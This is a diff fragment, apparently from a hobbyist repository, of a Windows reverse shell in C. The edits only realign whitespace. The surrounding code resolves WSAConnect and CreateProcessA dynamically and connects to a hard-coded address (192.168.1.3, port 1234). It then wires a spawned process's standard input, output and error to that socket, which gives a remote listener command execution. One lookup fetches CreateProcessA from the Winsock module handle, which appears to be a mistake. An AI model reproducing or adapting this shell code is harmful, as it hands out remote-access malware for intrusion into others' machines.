@@ -55,12 +55,12 @@ int main() {
   PWSAConnect      urmom_wsaconnect     = (PWSAConnect)      GetProcAddress  (Handle_WS2,       "WSAConnect");
   PCreateProcessA  urmom_createprocessa = (PCreateProcessA)  GetProcAddress  (Handle_WS2,   "CreateProcessA");
   
-  int    port = 1234;
+  int    port       = 1234;
   char * ip_address = "192.168.1.3";
 
-  WSADATA             wsd;
-  SOCKET              windows_socket;
-  struct sockaddr_in  socket_address;
+  WSADATA                             wsd;
+  SOCKET                   windows_socket;
+  struct sockaddr_in       socket_address;
   STARTUPINFO         startup_information;
   PROCESS_INFORMATION process_information;
 
@@ -102,10 +102,10 @@ int main() {
   memset(&startup_information, 0, sizeof(startup_information));
   
   startup_information.cb         = sizeof(startup_information);
-  startup_information.dwFlags    = STARTF_USESTDHANDLES;
-  startup_information.hStdInput  = (HANDLE)windows_socket;
-  startup_information.hStdOutput = (HANDLE)windows_socket;
-  startup_information.hStdError  = (HANDLE)windows_socket;
+  startup_information.dwFlags    =        STARTF_USESTDHANDLES;
+  startup_information.hStdInput  =      (HANDLE)windows_socket;
+  startup_information.hStdOutput =      (HANDLE)windows_socket;
+  startup_information.hStdError  =      (HANDLE)windows_socket;
 
   if (!CreateProcessA(
     NULL,
